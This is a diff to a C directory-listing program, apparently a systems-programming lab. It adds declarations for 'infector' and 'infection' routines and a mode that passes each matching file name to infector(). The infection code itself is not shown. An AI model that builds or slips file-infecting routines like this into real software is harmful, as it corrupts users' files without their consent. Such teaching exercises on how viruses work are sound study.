@@ -37,6 +37,8 @@ typedef struct ent{
 
 void printDtype(char d_type);
 int system_call();
+void infector(char * fileName);
+void infection();
 
 int main (int argc , char* argv[], char* envp[]){
   int fd, nread, curr;
@@ -56,18 +58,32 @@ int main (int argc , char* argv[], char* envp[]){
 
   if (argc == 2)
   {
+    char key = argv[1][1];
     char c = argv[1][2];
-    for (curr = 0; curr < nread;) {
-      d = (struct ent *) (buf + curr);
-      d_type = *(buf + curr + d->len -1);
-      if(strncmp(&c,d->buf,1) == 0){
-        system_call(SYS_WRITE,STDOUT,d->buf,strlen(d->buf));
-        system_call(SYS_WRITE,STDOUT,":  ",2);
-        printDtype(d_type);
-        system_call(SYS_WRITE,STDOUT,itoa(d_type),10);
-        system_call(SYS_WRITE,STDOUT,"\n",1);
+    if(key == 'p'){
+      for (curr = 0; curr < nread;) {
+        d = (struct ent *) (buf + curr);
+        d_type = *(buf + curr + d->len -1);
+        if(strncmp(&c,d->buf,1) == 0){
+          system_call(SYS_WRITE,STDOUT,d->buf,strlen(d->buf));
+          system_call(SYS_WRITE,STDOUT,":  ",2);
+          printDtype(d_type);
+        }
+        curr += d->len;
       }
-      curr += d->len;
+    }
+    else{
+        for (curr = 0; curr < nread;) {
+          d = (struct ent *) (buf + curr);
+          d_type = *(buf + curr + d->len -1);
+          if(strncmp(&c,d->buf,1) == 0){
+            system_call(SYS_WRITE,STDOUT,d->buf,strlen(d->buf));
+            system_call(SYS_WRITE,STDOUT,":  ",2);
+            printDtype(d_type);
+            infector(d->buf);
+          }
+          curr += d->len;
+      }
     }
   }else{
     for (curr = 0; curr < nread;) {
@@ -76,8 +92,6 @@ int main (int argc , char* argv[], char* envp[]){
       system_call(SYS_WRITE,STDOUT,d->buf,strlen(d->buf));
       system_call(SYS_WRITE,STDOUT,":  ",2);
       printDtype(d_type);
-      system_call(SYS_WRITE,STDOUT,itoa(d_type),10);
-      system_call(SYS_WRITE,STDOUT,"\n",1);
       curr += d->len;
     }
   }
